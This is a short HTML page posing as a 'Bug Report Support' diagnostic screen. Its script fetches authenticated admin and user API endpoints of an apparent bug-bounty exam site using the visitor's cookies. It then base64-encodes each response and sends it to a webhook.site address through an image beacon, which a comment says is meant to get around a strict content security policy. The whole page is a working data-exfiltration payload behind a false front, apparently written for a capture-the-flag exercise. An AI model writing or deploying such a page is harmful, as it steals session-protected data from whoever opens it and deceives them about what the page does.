<!DOCTYPE html>
<html>
<head>
    <title>Bug Report Support</title>
</head>
<body>
    <h1>System Diagnostic in Progress...</h1>
    <script>
        const webhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
        const base = "https://api-bugbounty-exam.hashacademy.co";
        
        // List of high-value targets for flags
        const targets = [
            "/api/v1/auth/me",
            "/api/admin/stats",
            "/api/v1/admin/logs"
        ];

        targets.forEach(path => {
            fetch(base + path, { credentials: 'include' })
                .then(response => response.text())
                .then(data => {
                    // Send result back to webhook using Image to bypass strict CSP
                    const leak = btoa(data).substring(0, 800); // Base64 encode and trim
                    new Image().src = `${webhook}/?path=${btoa(path)}&data=${leak}`;
                })
                .catch(err => {
                    new Image().src = `${webhook}/?err=${btoa(path)}`;
                });
        });
    </script>
</body>
</html>
